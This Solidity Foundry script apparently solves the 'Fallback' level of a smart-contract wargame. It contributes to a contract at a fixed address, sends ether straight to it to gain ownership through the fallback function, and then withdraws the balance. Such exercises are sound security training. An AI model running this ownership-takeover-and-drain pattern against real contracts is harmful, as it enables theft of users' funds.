// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../lib/forge-std/src/Script.sol';
import '../src/Fallback.sol';

contract FallbackScript is Script {
  Fallback target = Fallback(payable(0x1E757b2944d16cFa6333716F83dcA52D77936E70));
  uint player = vm.envUint('PRIVATE_KEY');

  function run() external {
    vm.startBroadcast(player);
    target.contribute{value: 1000 wei}();
    address(target).call{value: 1000 wei}('');
    target.withdraw();
    vm.stopBroadcast();
  }
}
